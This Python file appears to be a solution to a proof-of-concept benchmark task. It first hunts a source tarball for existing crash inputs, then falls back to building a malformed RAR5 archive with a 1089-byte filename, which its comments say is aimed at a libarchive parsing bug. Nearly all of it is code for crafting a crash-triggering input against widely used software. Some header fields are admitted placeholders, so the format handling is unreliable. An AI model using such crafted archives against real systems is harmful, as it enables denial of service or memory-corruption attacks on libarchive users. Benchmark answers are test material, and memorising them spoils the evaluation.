import os, tarfile, re, io, zlib, struct, tempfile, pathlib, random, itertools, typing, math, sys, shutil, textwrap, string, json, hashlib, bisect, collections, itertools, functools

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Attempt 1: Look for an existing PoC in the tarball
        wanted_patterns = ('.rar', '.poc', 'poc', 'crash', 'trigger', 'test', 'input')
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                for m in tf.getmembers():
                    name_lower = m.name.lower()
                    if m.isfile() and any(p in name_lower for p in wanted_patterns) and 0 < m.size < 50000:
                        f = tf.extractfile(m)
                        if f:
                            data = f.read()
                            if data:
                                return data
        except Exception:
            pass

        # Fallback: craft a minimal RAR5 archive with an over-long filename to hit the bug
        def vint(n: int) -> bytes:
            out = bytearray()
            while True:
                b = n & 0x7F
                n >>= 7
                if n:
                    out.append(b | 0x80)
                else:
                    out.append(b)
                    break
            return bytes(out)

        signature = b'Rar!\x1A\x07\x01\x00'

        # Archive header (type 1, flags 0)
        main_hdr_body = bytes([0x01]) + (0).to_bytes(2, 'little')
        main_crc = struct.pack('<I', zlib.crc32(main_hdr_body) & 0xFFFFFFFF)
        main_hdr = main_crc + main_hdr_body

        # File header (type 2, flags 0 => no extra, no data)
        file_hdr_fields = bytearray()
        file_hdr_fields += bytes([0x02])          # type
        file_hdr_fields += (0).to_bytes(2, 'little')  # flags

        # Mandatory file header fixed fields as they appear in libarchive code
        # Provide minimal placeholder values for: attr, mtime, unpacked_size,
        # compressed_size, file_crc. All are encoded as vint except attr (4b)
        file_hdr_fields += (0).to_bytes(4, 'little')  # attr
        file_hdr_fields += (0).to_bytes(4, 'little')  # mtime (low 4 bytes)
        file_hdr_fields += vint(0)                    # unpacked_size
        file_hdr_fields += vint(0)                    # compressed_size
        file_hdr_fields += (0).to_bytes(4, 'little')  # crc32

        # Overly long filename
        long_name_len = 1089
        file_hdr_fields += vint(long_name_len)
        long_name = b'A' * long_name_len
        file_hdr_fields += long_name

        file_crc = struct.pack('<I', zlib.crc32(file_hdr_fields) & 0xFFFFFFFF)
        file_hdr = file_crc + file_hdr_fields

        return signature + main_hdr + file_hdr
